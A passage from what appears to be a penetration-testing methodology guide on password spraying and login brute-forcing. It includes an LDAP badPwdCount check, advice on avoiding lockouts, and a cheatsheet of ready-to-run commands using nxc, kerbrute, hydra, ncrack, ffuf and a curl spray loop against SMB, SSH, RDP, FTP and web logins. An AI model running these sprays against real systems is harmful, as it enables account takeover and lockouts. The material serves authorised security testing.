  CNT=$(ldapsearch -x -LLL -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' \
    -b "DC=corp,DC=local" "(sAMAccountName=$u)" badPwdCount 2>/dev/null \
    | awk '/^badPwdCount:/ {print $2}')
  echo "${u}:${CNT:-0}"
done < users.txt > badpwd.post-window
diff badpwd.snapshot badpwd.post-window
```

> **Caveat:** `badPwdCount` is **not replicated** between DCs — each DC tracks independently. Always query AND auth against the **same DC**, or you'll undercount and trip lockout on a peer.

---

### Operational Hygiene

- Always `--continue-on-success` so tooling does not abort & resume noisily
- Log every credential discovered in a credential vault (e.g. `creds.txt`) — never re-enter manually
- Tag credentials with discovery method/time/source IP for the report
- After engagement: delete sprayed wordlists / temporary creds; rotate any service accounts you may have touched

[Back to top](#login-brute-forcing-methodology)

---

## Quick Reference Cheatsheet

```bash
# Always — first
nxc smb <DC_IP> --pass-pol

# AD spray (most common)
nxc smb <SUBNET>/24 -u users.txt -p 'Spring2026!' --continue-on-success
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt 'Spring2026!'

# SSH
hydra -L users.txt -P pass.txt ssh://<TARGET> -t 4 -V -e nsr

# RDP
ncrack -vv -U users.txt -P pass.txt rdp://<TARGET> -T 3

# FTP
hydra -L users.txt -P pass.txt ftp://<TARGET> -e nsr

# HTTP POST form
hydra -L users.txt -P pass.txt <TARGET> http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid" -V

# ffuf web spray
ffuf -w pass.txt -X POST -d "u=admin&p=FUZZ" \
  -u http://<TARGET>/login -fs <FAIL_SIZE>

# LOTL bash spray
xargs -a users.txt -P 5 -I{} bash -c \
  'curl -s -d "u={}&p=Spring2026!" http://<TARGET>/login | grep -q Invalid || echo "[+] {}"'
```

> **All sprays failed?** (1) Revisit user enumeration for missed accounts. (2) Try default/vendor creds from attacking-common-applications.md. (3) If you captured hashes, escalate to offline cracking (password-cracking.md). (4) Return to enumeration-methodology.md for alternate attack surfaces.
